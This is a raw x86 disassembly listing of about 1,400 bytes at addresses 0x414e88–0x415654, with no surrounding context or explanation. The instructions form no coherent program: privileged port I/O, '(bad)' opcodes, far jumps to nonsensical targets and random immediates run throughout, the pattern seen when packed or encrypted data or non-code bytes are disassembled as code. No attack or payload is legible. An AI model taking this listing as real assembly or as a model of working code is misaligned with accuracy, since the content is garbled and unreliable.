  414e88:	mov    edi,0x854c936a
  414e8d:	fld    DWORD PTR [esi+0x79]
  414e90:	jne    0x414ece
  414e92:	dec    ebp
  414e93:	popa   
  414e94:	mov    esp,0xdcd7628b
  414e99:	xlat   BYTE PTR ds:[ebx]
  414e9a:	push   ebp
  414e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e9c:	loope  0x414e9d
  414e9e:	in     al,0x66
  414ea0:	or     al,0x1d
  414ea2:	xchg   edx,eax
  414ea3:	jnp    0x414e89
  414ea5:	xor    eax,0xbaaf862d
  414eaa:	inc    esi
  414eab:	pop    edx
  414eac:	jl     0x414e74
  414eae:	aas    
  414eaf:	sbb    esp,esp
  414eb1:	loope  0x414e8f
  414eb3:	pop    ecx
  414eb4:	out    dx,eax
  414eb5:	outs   dx,BYTE PTR ds:[esi]
  414eb6:	mov    eax,ds:0xb8c75706
  414ebb:	sti    
  414ebc:	xabort 0x86
  414ebf:	gs pop ebp
  414ec1:	or     cl,BYTE PTR [esi-0x52]
  414ec4:	ja     0x414eb9
  414ec6:	mov    ch,0x2b
  414ec8:	or     eax,0xc0773ec5
  414ecd:	outs   dx,DWORD PTR ds:[esi]
  414ece:	add    DWORD PTR [edx+0x7eba5a30],esi
  414ed4:	sbb    eax,0x90840aad
  414ed9:	jmp    0x414ec0
  414edb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414edc:	lea    edx,fs:[edi-0x3]
  414ee0:	push   ds
  414ee1:	xrelease xchg BYTE PTR [edi+0x6d],ah
  414ee5:	push   edi
  414ee6:	mov    bl,dl
  414ee8:	mov    ebp,ecx
  414eea:	lods   eax,DWORD PTR ds:[esi]
  414eeb:	sbb    eax,0xa389acfa
  414ef0:	je     0x414f44
  414ef2:	jo     0x414f39
  414ef4:	std    
  414ef5:	imul   eax,DWORD PTR [esi-0x51df1d21],0x5
  414efc:	sub    BYTE PTR [ecx-0x19],0x4a
  414f00:	test   DWORD PTR cs:[edx+0x49],esi
  414f04:	mov    ch,0x32
  414f06:	outs   dx,DWORD PTR ds:[esi]
  414f07:	dec    eax
  414f08:	push   DWORD PTR [esi]
  414f0a:	jmp    0x2a1db71f
  414f0f:	lods   eax,DWORD PTR ds:[esi]
  414f10:	jg     0x414ee3
  414f12:	lahf   
  414f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f14:	and    edx,DWORD PTR [edi+edx*8]
  414f17:	inc    ebp
  414f18:	sbb    al,0x10
  414f1a:	pop    edx
  414f1b:	or     DWORD PTR [edx+0x246fe014],0xea9542b1
  414f25:	scas   eax,DWORD PTR es:[edi]
  414f26:	mov    bh,0xac
  414f28:	pop    ecx
  414f29:	sbb    eax,0x173901b9
  414f2e:	dec    eax
  414f2f:	js     0x414eb9
  414f31:	dec    ebp
  414f32:	adc    edi,esp
  414f34:	mov    bl,ch
  414f36:	out    0x3d,al
  414f38:	cmp    cl,ch
  414f3a:	dec    esi
  414f3b:	jp     0x414ee2
  414f3d:	test   al,0x19
  414f3f:	and    BYTE PTR [ecx],ch
  414f41:	xlat   BYTE PTR ds:[ebx]
  414f42:	dec    ecx
  414f43:	ja     0x414edf
  414f45:	xchg   edx,eax
  414f46:	ins    BYTE PTR es:[edi],dx
  414f47:	xor    eax,0x972fddcd
  414f4c:	loope  0x414fc3
  414f4e:	xor    eax,0x9aaea400
  414f53:	push   ecx
  414f54:	jecxz  0x414f8d
  414f56:	(bad)  
  414f57:	sti    
  414f58:	xor    al,0x10
  414f5a:	jne    0x414ef3
  414f5c:	push   ds
  414f5d:	inc    esp
  414f5e:	inc    ebp
  414f5f:	jnp    0x414fdc
  414f61:	enter  0xdbd9,0x3c
  414f65:	push   eax
  414f66:	nop
  414f67:	inc    eax
  414f68:	daa    
  414f69:	fldenv [edx+0x78616761]
  414f6f:	pop    ebx
  414f70:	xchg   ebp,eax
  414f71:	push   eax
  414f72:	scas   al,BYTE PTR es:[edi]
  414f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f74:	enter  0xb52c,0x30
  414f78:	xor    eax,0x78fc53df
  414f7d:	mov    eax,ds
  414f7f:	fsubr  st,st(7)
  414f81:	adc    al,BYTE PTR [edi+0x62c02553]
  414f87:	cdq    
  414f88:	xor    esp,DWORD PTR [edx+0x19]
  414f8b:	xchg   DWORD PTR ds:[edi-0xa],eax
  414f8f:	aas    
  414f90:	test   al,0x49
  414f92:	mov    eax,0xae937bcc
  414f97:	sub    dl,BYTE PTR ds:0x32a43714
  414f9d:	sub    edi,DWORD PTR [ecx]
  414f9f:	jl     0x414f9b
  414fa1:	and    DWORD PTR [edi+0x31fb76f6],ebp
  414fa7:	pop    esi
  414fa8:	pop    edx
  414fa9:	pop    eax
  414faa:	xor    DWORD PTR [edx],esi
  414fac:	std    
  414fad:	adc    eax,0xa089fe6d
  414fb2:	sub    al,0x9b
  414fb4:	jg     0x414f75
  414fb6:	fistp  WORD PTR ds:0x196c8f20
  414fbc:	out    0x6f,al
  414fbe:	jno    0x415011
  414fc0:	sbb    eax,0x1c5e0bf7
  414fc5:	(bad)  
  414fc6:	loop   0x414ff8
  414fc8:	push   ds
  414fc9:	inc    ebx
  414fca:	out    dx,al
  414fcb:	jns    0x414fc9
  414fcd:	adc    DWORD PTR [esi],eax
  414fcf:	adc    al,BYTE PTR [eax]
  414fd1:	push   edi
  414fd2:	test   al,0x96
  414fd4:	(bad)  
  414fd6:	xchg   esi,eax
  414fd7:	cdq    
  414fd8:	das    
  414fd9:	hlt    
  414fda:	fs mov esp,0xfeca293c
  414fe0:	sub    al,dl
  414fe2:	addr16 push 0x1b022470
  414fe8:	pop    edi
  414fe9:	add    edi,ecx
  414feb:	pop    ss
  414fec:	mov    ds:0x1f7e7c10,al
  414ff1:	jne    0x414fe0
  414ff3:	stos   BYTE PTR es:[edi],al
  414ff4:	test   esi,ecx
  414ff6:	jge    0x414fa5
  414ff8:	mov    al,ds:0xcc5f4466
  414ffd:	mov    eax,0x928718e9
  415002:	aam    0x41
  415004:	(bad)  
  415006:	inc    ecx
  415007:	and    eax,0xfec28222
  41500c:	stos   BYTE PTR es:[edi],al
  41500d:	jns    0x415003
  41500f:	xor    BYTE PTR [esi-0x4],dl
  415012:	out    0x1e,al
  415014:	aad    0x6f
  415016:	popa   
  415017:	sar    BYTE PTR [ebp+0x6],0x2c
  41501b:	pop    ss
  41501c:	(bad)  
  41501d:	dec    ebp
  41501e:	mov    ah,0x61
  415020:	push   ebx
  415021:	jge    0x415022
  415023:	aas    
  415024:	sbb    dh,BYTE PTR [esi+0x5]
  415027:	xchg   ecx,eax
  415028:	imul   BYTE PTR [ebp+0x4b9da8b0]
  41502e:	into   
  41502f:	std    
  415030:	lock fs sbb ebp,edi
  415034:	mov    ds:0xd85d9c2e,eax
  415039:	jne    0x4150b0
  41503b:	push   ebp
  41503c:	mov    ebp,0x78924a19
  415041:	mov    cl,0x44
  415043:	and    eax,0xab5ec59e
  415048:	int3   
  415049:	or     ch,BYTE PTR [ebx+ebx*2-0x7e607878]
  415050:	push   esp
  415051:	push   ecx
  415052:	xchg   ecx,eax
  415053:	sbb    al,0x46
  415055:	ins    DWORD PTR es:[edi],dx
  415056:	gs call 0x8d4e:0x214a658c
  41505e:	dec    eax
  41505f:	inc    esi
  415060:	(bad)  
  415061:	jmp    0xdc5e2a94
  415066:	(bad)  
  415067:	lea    eax,[ebp-0x4e]
  41506a:	add    edi,DWORD PTR [ecx-0x34]
  41506d:	pop    es
  41506e:	pop    ebp
  41506f:	mov    ds:0xcdd1bdea,eax
  415074:	push   edx
  415075:	dec    ebp
  415076:	iret   
  415077:	push   edx
  415078:	mov    bl,BYTE PTR [ecx]
  41507a:	jno    0x41506e
  41507c:	fdivr  st(5),st
  41507e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41507f:	xchg   ecx,eax
  415080:	aas    
  415081:	pusha  
  415082:	dec    edi
  415083:	mov    bh,0x74
  415085:	ins    BYTE PTR es:[edi],dx
  415086:	in     al,dx
  415087:	(bad)  
  415088:	pop    eax
  415089:	dec    esi
  41508a:	retf   0xfa63
  41508d:	push   esp
  41508e:	or     al,al
  415090:	jg     0x41501c
  415092:	adc    esi,edx
  415094:	test   BYTE PTR [ecx-0x4f362347],bh
  41509a:	xchg   ebp,eax
  41509b:	sbb    al,0xbb
  41509d:	push   ebp
  41509e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41509f:	mov    bh,0xa
  4150a1:	add    BYTE PTR [eax-0x2fd66b2c],al
  4150a7:	pusha  
  4150a8:	cmp    BYTE PTR ds:0x2b7d7ce7,ch
  4150ae:	nop
  4150af:	aas    
  4150b0:	in     eax,0xa4
  4150b2:	xor    DWORD PTR [ebx+0x69],0xb43d2083
  4150b9:	aas    
  4150ba:	std    
  4150bb:	daa    
  4150bc:	lahf   
  4150bd:	sub    al,0x9f
  4150bf:	clc    
  4150c0:	sbb    al,0xef
  4150c2:	div    BYTE PTR [edx+0x77]
  4150c5:	or     edi,ebp
  4150c7:	data16 sti 
  4150c9:	jne    0x4150ba
  4150cb:	xchg   ebp,eax
  4150cc:	sub    DWORD PTR [edx+0x74a3cd2e],esi
  4150d2:	sub    DWORD PTR [edi+0x14],0x59
  4150d6:	push   eax
  4150d7:	out    dx,al
  4150d8:	pop    ebx
  4150d9:	mov    ?,ebp
  4150db:	stc    
  4150dc:	inc    edx
  4150dd:	leave  
  4150de:	push   ds
  4150df:	mov    cl,BYTE PTR [ebx+0x23d79c8]
  4150e5:	rcr    BYTE PTR ds:0x32326dd8,0x7
  4150ec:	aas    
  4150ed:	inc    BYTE PTR [eax-0x73903b64]
  4150f3:	xchg   ecx,eax
  4150f4:	add    bh,cl
  4150f6:	lods   al,BYTE PTR ds:[esi]
  4150f7:	sbb    ebx,DWORD PTR [edi+0x43]
  4150fa:	xchg   edi,eax
  4150fb:	mov    ds:0x2993eadd,eax
  415100:	fstp   DWORD PTR ds:0xc50ad7f3
  415106:	lea    ebp,[esi+ecx*1+0x48594d22]
  41510d:	inc    ecx
  41510e:	mov    ds:0x9609b94c,eax
  415113:	mov    ?,WORD PTR [ebx+ebp*8+0x32627ee7]
  41511a:	add    DWORD PTR [ebx+0xd64d2a8],0x83fa14d
  415124:	xor    eax,0x36ac499
  41512a:	fsub   DWORD PTR [ecx+0x2d]
  41512d:	icebp  
  41512e:	xor    dh,dl
  415130:	cmp    al,BYTE PTR [edx+0x7fb4b42b]
  415136:	sbb    dl,al
  415138:	ret    
  415139:	cmp    DWORD PTR [eax],ebp
  41513b:	push   ss
  41513c:	mov    ds:0x36f91837,eax
  415141:	push   0x53
  415143:	jle    0x415135
  415145:	data16 cmp al,0x42
  415148:	inc    ecx
  415149:	xchg   esi,eax
  41514a:	xchg   esp,eax
  41514b:	loope  0x4150e5
  41514d:	inc    eax
  41514e:	or     esp,DWORD PTR [edx+0x19]
  415151:	(bad)  
  415152:	cmc    
  415153:	cwde   
  415154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415155:	clc    
  415156:	fimul  DWORD PTR [edi-0x58]
  415159:	dec    ecx
  41515a:	sub    al,0xd6
  41515c:	mov    dh,0x2e
  41515e:	mov    bl,0xe1
  415160:	pop    edx
  415161:	daa    
  415162:	test   DWORD PTR [edi],ebp
  415164:	inc    esp
  415165:	add    al,0xef
  415167:	cli    
  415168:	in     eax,0x7b
  41516a:	cmc    
  41516b:	mov    bh,0x53
  41516d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41516e:	ja     0x41516c
  415170:	jae    0x4151a1
  415172:	cmp    BYTE PTR [esi+ecx*8],dl
  415175:	xlat   BYTE PTR ds:[ebx]
  415176:	js     0x415166
  415178:	js     0x415176
  41517a:	out    0xe5,al
  41517c:	test   eax,0x37c6c841
  415181:	inc    esi
  415182:	jge    0x415135
  415184:	lock xor BYTE PTR [esi],bl
  415187:	mov    esi,0x7f75f349
  41518c:	mov    edi,0x4cf7b563
  415191:	(bad)
  415196:	add    al,0xc1
  415198:	pop    ebp
  415199:	xor    eax,ebp
  41519b:	inc    ebp
  41519c:	adc    dl,BYTE PTR [ecx-0x46b21a32]
  4151a2:	sbb    cl,BYTE PTR [eax-0x152ba2c3]
  4151a8:	or     DWORD PTR [edx+0x1c],edi
  4151ab:	xchg   BYTE PTR ds:0xef204307,al
  4151b1:	dec    ecx
  4151b3:	push   ss
  4151b4:	das    
  4151b5:	das    
  4151b6:	cli    
  4151b7:	scas   eax,DWORD PTR es:[edi]
  4151b8:	sbb    bl,BYTE PTR [ebp-0x3593f2f]
  4151be:	add    al,0x9f
  4151c0:	sti    
  4151c1:	(bad)  [esp+ebp*2+0x7a]
  4151c5:	sahf   
  4151c6:	jno    0x4151d7
  4151c8:	fidiv  WORD PTR [ebx]
  4151ca:	mov    al,BYTE PTR [ebx+0x1c]
  4151cd:	pop    ebx
  4151ce:	sbb    eax,0xe2e4a87f
  4151d3:	icebp  
  4151d4:	mov    edi,0x2010fd3c
  4151d9:	int    0x5a
  4151db:	shr    DWORD PTR [ebx+eiz*1],1
  4151de:	add    al,0xb
  4151e0:	mov    cl,0x67
  4151e2:	xchg   DWORD PTR [edi-0x31664c56],edi
  4151e8:	or     al,0xf3
  4151ea:	and    BYTE PTR [edi+0x9],dl
  4151ed:	adc    eax,0xd2d45f58
  4151f2:	xchg   ebp,eax
  4151f3:	mov    edx,0x7f23c757
  4151f8:	out    0xd3,al
  4151fa:	xchg   esi,eax
  4151fb:	push   ds
  4151fc:	and    al,0x1
  4151fe:	sbb    DWORD PTR [ecx+0x25],ecx
  415201:	adc    DWORD PTR [eax+0x6a],eax
  415204:	int    0x86
  415206:	ror    DWORD PTR ds:0xc0023bf2,cl
  41520c:	arpl   WORD PTR [eax+0x578ba320],sp
  415212:	enter  0x40ff,0x3e
  415216:	retf   0x2378
  415219:	xchg   ebp,eax
  41521a:	push   esp
  41521b:	and    esp,DWORD PTR [edi-0x57]
  41521e:	mov    ch,0x9d
  415220:	call   0xb317570e
  415225:	adc    ebx,esp
  415227:	pop    ebp
  415228:	mov    ds:0x4334df28,al
  41522d:	or     al,0xb7
  41522f:	fwait
  415230:	mov    eax,ds:0x3e6baf12
  415235:	fwait
  415236:	data16 mov bl,0xf0
  415239:	in     al,dx
  41523a:	jbe    0x415296
  41523c:	pop    ecx
  41523d:	sti    
  41523e:	mov    ebx,0xb730733e
  415243:	test   DWORD PTR [esi],ebp
  415245:	pop    ecx
  415246:	aam    0xe3
  415248:	sbb    esi,ebx
  41524a:	sahf   
  41524b:	int    0x93
  41524d:	cmp    BYTE PTR [ebx-0x593ccfb4],0x3d
  415254:	xor    eax,0xb98b612c
  415259:	out    dx,eax
  41525a:	hlt    
  41525b:	das    
  41525c:	fwait
  41525d:	lods   eax,DWORD PTR ds:[esi]
  41525e:	jp     0x415283
  415260:	adc    ch,bh
  415262:	popa   
  415263:	push   ds
  415264:	jnp    0x41528a
  415266:	por    mm5,QWORD PTR [ebp+0x42]
  41526a:	sub    DWORD PTR [ecx+0x5ea8284f],0xffffff83
  415271:	or     DWORD PTR [ecx+ebx*2+0x5e],ebp
  415275:	ret    
  415276:	pop    eax
  415277:	gs out 0xe0,al
  41527a:	call   0x3890:0x66c85560
  415281:	mov    esi,DWORD PTR [edx]
  415283:	jmp    0x415284
  415285:	push   ebp
  415286:	pop    ds
  415287:	fwait
  415288:	loop   0x415220
  41528a:	je     0x4152fd
  41528c:	loop   0x415236
  41528e:	aaa    
  41528f:	and    ch,BYTE PTR ds:0x96d67f45
  415295:	inc    ecx
  415296:	add    esi,DWORD PTR [esi]
  415298:	add    ch,ch
  41529a:	in     eax,dx
  41529b:	aam    0xb2
  41529d:	enter  0x2d8b,0x7d
  4152a1:	dec    eax
  4152a2:	adc    DWORD PTR [eax+0x3ee020ea],esi
  4152a8:	mov    al,0xe7
  4152aa:	jl     0x41529f
  4152ac:	add    eax,0x707ceac5
  4152b1:	ja     0x4152dd
  4152b3:	mov    ch,0x97
  4152b5:	add    DWORD PTR [eax+0x7ad1f7cc],0x7fcc0384
  4152bf:	xchg   ebp,eax
  4152c0:	ss in  eax,0x38
  4152c3:	jo     0x415321
  4152c5:	cmp    BYTE PTR [edx+0x409e430a],dh
  4152cb:	inc    edi
  4152cc:	jecxz  0x4152ac
  4152ce:	push   0xffffff9c
  4152d0:	cmp    edx,DWORD PTR [esi-0x7a2a118]
  4152d6:	fadd   QWORD PTR [edx-0x51077786]
  4152dc:	mov    ecx,0xf197c567
  4152e1:	aaa    
  4152e2:	(bad)  
  4152e3:	jmp    0xfbbc:0x4ab79cd8
  4152ea:	xlat   BYTE PTR ds:[ebx]
  4152eb:	xchg   edx,eax
  4152ec:	sti    
  4152ed:	fistp  DWORD PTR [ecx+0x11]
  4152f0:	rcl    dl,0xda
  4152f3:	out    dx,eax
  4152f4:	push   ss
  4152f5:	cmp    BYTE PTR [eax+0x1],0xd0
  4152f9:	mov    ah,0xd4
  4152fb:	cmp    eax,0x6c74d7cf
  415300:	dec    edx
  415301:	pop    esp
  415302:	ja     0x415379
  415304:	sbb    al,0x5d
  415306:	ja     0x415364
  415308:	or     BYTE PTR [edi+0x42],cl
  41530b:	mov    dh,0x76
  41530d:	jo     0x415321
  41530f:	lods   eax,DWORD PTR ds:[esi]
  415310:	test   edx,ecx
  415312:	inc    ebx
  415313:	jns    0x415376
  415315:	mov    dl,0x45
  415317:	inc    edi
  415318:	in     eax,dx
  415319:	stos   BYTE PTR es:[edi],al
  41531a:	xor    eax,0x3e0a88b0
  41531f:	pop    edx
  415320:	scas   eax,DWORD PTR es:[edi]
  415321:	and    eax,0xf1e69b27
  415326:	inc    ecx
  415327:	cmp    ebx,DWORD PTR [eax]
  415329:	inc    eax
  41532a:	(bad)  
  41532b:	lods   eax,DWORD PTR ds:[esi]
  41532c:	cmp    ebx,DWORD PTR [edi]
  41532e:	bswap  edx
  415330:	jmp    DWORD PTR [edi]
  415332:	mov    dh,0xe9
  415334:	xlat   BYTE PTR ds:[ebx]
  415335:	or     esi,DWORD PTR [eax+0x7b]
  415338:	push   0xffffffa6
  41533a:	(bad)  
  41533b:	cmp    ebx,0xffffff83
  41533e:	sbb    eax,0x7df0490f
  415343:	jl     0x4152fd
  415345:	cli    
  415346:	pop    esp
  415347:	hlt    
  415348:	push   ds
  415349:	mov    al,0xb7
  41534b:	gs sbb al,0x60
  41534e:	pop    edx
  41534f:	xor    BYTE PTR [edx-0x6d2c8bfe],bl
  415355:	stos   DWORD PTR es:[edi],eax
  415356:	mov    edi,0x937888ae
  41535b:	pop    ebp
  41535c:	loopne 0x4153a6
  41535e:	into   
  41535f:	retf   
  415360:	jecxz  0x4153a8
  415362:	arpl   WORD PTR [ecx+0x5e119bb8],bp
  415368:	rcl    BYTE PTR [esi+0x11],1
  41536b:	push   ss
  41536c:	push   ebx
  41536d:	add    al,0xd8
  41536f:	orps   xmm7,xmm0
  415372:	sub    eax,0x5554fff5
  415377:	xchg   esi,eax
  415378:	sub    al,0x80
  41537a:	adc    BYTE PTR [edi+0x1150557c],ch
  415380:	mov    cl,0xb1
  415382:	xchg   edi,eax
  415383:	xchg   edx,eax
  415384:	lods   al,BYTE PTR ds:[esi]
  415385:	loopne 0x4153f7
  415387:	inc    edi
  415388:	mov    ds:0x9704e9cb,al
  41538d:	xor    edi,DWORD PTR [esi-0x20bc12a6]
  415393:	add    dl,BYTE PTR [eax+0x18a682a1]
  415399:	mov    ebx,0xd6dca35b
  41539e:	pop    edx
  41539f:	push   0xffffff87
  4153a1:	mov    ds:0x77154422,al
  4153a6:	jno    0x41534e
  4153a8:	and    bl,cl
  4153aa:	test   al,0x9a
  4153ac:	add    al,0x41
  4153ae:	into   
  4153af:	pop    eax
  4153b0:	mov    ah,BYTE PTR [esi]
  4153b2:	call   0x29ee:0x4786d5ab
  4153b9:	mov    BYTE PTR [ebx+eax*1-0x240a807e],ch
  4153c0:	push   0xd89e9c9d
  4153c5:	mov    fs,WORD PTR [edi-0x64]
  4153c8:	pop    ds
  4153c9:	call   0x9ee9:0x355f336b
  4153d0:	sbb    ebx,DWORD PTR [ecx-0x27]
  4153d3:	mov    ds:0xaa86b94,al
  4153d8:	push   ss
  4153d9:	jge    0x4153fe
  4153db:	xor    esi,esi
  4153dd:	sub    DWORD PTR [edx],edi
  4153df:	mov    ds:0x4b00801a,eax
  4153e4:	test   ch,ah
  4153e6:	mov    al,ds:0x99f44e50
  4153eb:	push   ds
  4153ec:	addr16 (bad) 
  4153ee:	cld    
  4153ef:	add    DWORD PTR [ebx+0x38],edi
  4153f2:	(bad)  
  4153f4:	ins    BYTE PTR es:[edi],dx
  4153f5:	mov    DWORD PTR [edx-0x32],edx
  4153f8:	pop    ecx
  4153f9:	dec    ecx
  4153fa:	mov    al,ds:0xf1f7f5eb
  4153ff:	out    0x4,al
  415401:	adc    DWORD PTR [edx-0x365144e5],eax
  415407:	repz cs ja 0x41547e
  41540b:	mov    dh,0x7
  41540d:	lahf   
  41540e:	jb     0x41539d
  415410:	das    
  415411:	jl     0x415408
  415413:	call   0xaabf7ce2
  415418:	aas    
  415419:	mov    dl,0xea
  41541b:	push   eax
  41541c:	retf   
  41541d:	and    BYTE PTR [ebp-0x43e0d94b],ch
  415423:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  415425:	(bad)  
  415426:	push   cs
  415427:	xor    ecx,DWORD PTR [edi]
  415429:	cmp    al,0x9b
  41542b:	jmp    0xaff91518
  415430:	pop    edx
  415431:	inc    edx
  415432:	sub    DWORD PTR [ebx-0x52351263],ebx
  415438:	cwde   
  415439:	add    esi,0x285e0464
  41543f:	ror    dh,cl
  415441:	leave  
  415442:	push   cs
  415443:	dec    ecx
  415444:	icebp  
  415445:	pop    edx
  415446:	pusha  
  415447:	test   DWORD PTR [esi],edx
  415449:	shl    DWORD PTR [ecx+ebp*2+0x2bb1af8e],cl
  415450:	add    BYTE PTR [ebx],ch
  415452:	sub    eax,0x75e84a71
  415457:	and    eax,0x8afc4e90
  41545c:	sub    eax,DWORD PTR [esi]
  41545e:	outs   dx,DWORD PTR ds:[esi]
  41545f:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  415461:	xchg   DWORD PTR [edx+0x77],edx
  415464:	bound  edx,QWORD PTR [edi+0x0]
  415467:	or     al,0x25
  415469:	dec    ebx
  41546a:	outs   dx,BYTE PTR ds:[esi]
  41546b:	push   0x5641d323
  415470:	cmp    al,0x48
  415472:	push   ss
  415473:	fs push 0x1ae5fe3
  415479:	push   ebx
  41547a:	dec    ebx
  41547b:	lahf   
  41547c:	push   ebx
  41547d:	and    eax,0xe5336b37
  415482:	std    
  415483:	jae    0x4154fe
  415485:	jle    0x415461
  415487:	aaa    
  415488:	xchg   DWORD PTR [ebx],eax
  41548a:	inc    ebp
  41548b:	mov    edx,0xc03b09ac
  415490:	dec    esi
  415491:	in     eax,0xc2
  415493:	int    0x18
  415495:	add    BYTE PTR [edi],cl
  415497:	jmp    0x41541f
  415499:	xlat   BYTE PTR ds:[ebx]
  41549a:	addr16 xchg edi,eax
  41549c:	test   eax,0x7368e918
  4154a1:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154a3:	test   eax,0xdc82f3d0
  4154a8:	xor    ebp,esi
  4154aa:	gs jge 0x4154cd
  4154ad:	popa   
  4154ae:	outs   dx,BYTE PTR ds:[esi]
  4154af:	les    ebp,FWORD PTR [eax]
  4154b1:	adc    al,0x9
  4154b3:	ror    DWORD PTR [edx+0x64],cl
  4154b6:	imul   ebp,DWORD PTR [edi+0x15],0x5d
  4154ba:	nop
  4154bb:	jg     0x415467
  4154bd:	hlt    
  4154be:	loop   0x415524
  4154c0:	mov    al,0x5e
  4154c2:	clc    
  4154c3:	pop    edx
  4154c4:	cmp    BYTE PTR [ebp+0x38],dh
  4154c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154c8:	cmp    BYTE PTR [esi],ch
  4154ca:	sbb    DWORD PTR [eax],ebp
  4154cc:	mov    ecx,ss
  4154ce:	push   edx
  4154cf:	fistp  DWORD PTR [edi]
  4154d1:	bound  eax,QWORD PTR [ebp+eax*8+0x2c655108]
  4154d8:	adc    DWORD PTR [edi+0x26],0xa5f69ed9
  4154df:	and    eax,0xfc09aa30
  4154e4:	test   eax,0x26080129
  4154e9:	mov    al,ds:0x5f22f902
  4154ee:	jp     0x4154ba
  4154f0:	jno    0x4154c4
  4154f2:	addr16 mov eax,0xf5255e18
  4154f8:	(bad)  
  4154fa:	sub    DWORD PTR [ebp-0x191850f7],ebx
  415500:	push   cs
  415501:	scas   al,BYTE PTR es:[edi]
  415502:	pop    ds
  415503:	mov    ebp,0xdcca9cb8
  415508:	xchg   ch,dh
  41550a:	stos   DWORD PTR es:[edi],eax
  41550b:	xor    BYTE PTR [eax+esi*4],al
  41550e:	pop    ebx
  41550f:	mov    BYTE PTR [esi+eiz*4],bh
  415512:	popf   
  415513:	ret    
  415514:	scas   eax,DWORD PTR es:[edi]
  415515:	or     eax,0x19184a2e
  41551a:	xor    esi,DWORD PTR [edi+0x62697acf]
  415520:	sti    
  415521:	adc    DWORD PTR [ebx+ecx*8-0x20d8d5cb],esi
  415528:	scas   eax,DWORD PTR es:[edi]
  415529:	fidiv  WORD PTR [eax-0x70]
  41552c:	out    dx,eax
  41552d:	adc    eax,esi
  41552f:	inc    eax
  415530:	xor    DWORD PTR [esi-0x74],eax
  415533:	fwait
  415534:	add    ebp,DWORD PTR [edx-0x4c9a7b6b]
  41553a:	jmp    0x4822:0x36a41813
  415541:	push   ss
  415542:	push   ebp
  415543:	push   edi
  415544:	iret   
  415545:	loop   0x41558b
  415547:	scas   eax,DWORD PTR es:[edi]
  415548:	call   0x78e6a404
  41554d:	std    
  41554e:	xor    eax,0x72184b01
  415553:	sub    eax,0xa328225a
  415558:	mov    esi,0x5e70e1a
  41555d:	sub    cl,BYTE PTR [ebx-0x2b]
  415560:	jno    0x4155a1
  415562:	inc    esi
  415563:	add    ebx,DWORD PTR [edi]
  415565:	jmp    0x353f:0xafff92bf
  41556c:	mov    ds:0xd1c4973e,eax
  415571:	ins    BYTE PTR es:[edi],dx
  415572:	and    cl,BYTE PTR [ebx-0x2d]
  415575:	clc    
  415576:	push   ebx
  415577:	lock mov edi,0x224e146b
  41557d:	xchg   edi,eax
  41557e:	xchg   ebp,eax
  41557f:	fwait
  415580:	jge    0x41552a
  415582:	test   eax,0xebee447b
  415587:	out    0xe6,al
  415589:	(bad)  
  41558a:	mov    eax,0xbc92ff2
  41558f:	mov    eax,0xa1815807
  415594:	inc    esp
  415595:	pop    esi
  415596:	retf   
  415597:	iret   
  415598:	sbb    cl,bl
  41559a:	dec    edi
  41559b:	sub    al,dl
  41559d:	and    DWORD PTR [esi+0x21f176ea],eax
  4155a3:	add    ecx,DWORD PTR [ebp+0x6d4bb6f9]
  4155a9:	sbb    BYTE PTR [edx+0x124deb54],al
  4155af:	add    DWORD PTR [edi],esp
  4155b1:	xor    DWORD PTR [ecx-0x28fbe77f],edx
  4155b7:	xor    DWORD PTR [edx+0x13],esp
  4155ba:	sbb    ecx,edx
  4155bc:	mov    WORD PTR [ebx-0x4218d2aa],cs
  4155c2:	add    DWORD PTR [ebp-0x59],0x4a
  4155c6:	(bad)  
  4155c7:	jae    0x4155bc
  4155c9:	mov    eax,ds:0x5cbba124
  4155ce:	pop    eax
  4155cf:	repz sbb DWORD PTR [edx+0x2ad24d84],ebp
  4155d6:	pop    ebp
  4155d7:	lods   eax,DWORD PTR ds:[esi]
  4155d8:	or     BYTE PTR [ecx],al
  4155da:	adc    edx,DWORD PTR [eax+edx*8-0x4b]
  4155de:	(bad)  
  4155df:	lods   eax,DWORD PTR ds:[esi]
  4155e0:	jbe    0x41557c
  4155e2:	inc    ecx
  4155e3:	(bad)  
  4155e4:	xlat   BYTE PTR ds:[ebx]
  4155e5:	(bad)  
  4155e6:	adc    eax,0x9945aafb
  4155eb:	pop    esi
  4155ec:	cmp    al,0x9b
  4155ee:	into   
  4155ef:	je     0x415611
  4155f1:	sub    eax,0x1cdf81bb
  4155f6:	jne    0x415611
  4155f8:	and    BYTE PTR [ebp+0x3dab607e],dl
  4155fe:	gs leave 
  415600:	and    ecx,esp
  415602:	ja     0x4155aa
  415604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415605:	mov    esp,DWORD PTR [ecx+0x2c]
  415608:	das    
  415609:	dec    ecx
  41560a:	xchg   ebx,eax
  41560b:	inc    eax
  41560c:	jne    0x415643
  41560e:	mov    esi,0x688cf5d7
  415613:	sti    
  415614:	shr    BYTE PTR [esi-0x56bce978],1
  41561a:	inc    edx
  41561b:	and    ebx,esi
  41561d:	mov    eax,0xe5e330ae
  415622:	mov    dl,0xe2
  415624:	shl    BYTE PTR [eax],cl
  415626:	ins    DWORD PTR es:[edi],dx
  415627:	lds    edx,FWORD PTR [edx]
  415629:	or     al,0xe7
  41562b:	xor    DWORD PTR [edi],ecx
  41562d:	jl     0x4155fb
  41562f:	dec    ebx
  415630:	daa    
  415631:	js     0x415604
  415633:	cld    
  415634:	lods   eax,DWORD PTR ds:[esi]
  415635:	add    edx,eax
  415637:	mov    ebx,0xca7369ec
  41563c:	or     DWORD PTR [esi],ebp
  41563e:	mov    edx,DWORD PTR ds:0x512d1401
  415644:	jg     0x415643
  415646:	xchg   esp,eax
  415647:	shr    BYTE PTR ds:0xa8ce576a,0x9e
  41564e:	or     dl,BYTE PTR [ecx]
  415650:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415651:	sahf   
  415652:	jbe    0x4156c9
  415654:	mov    al,ds:0x6476787f
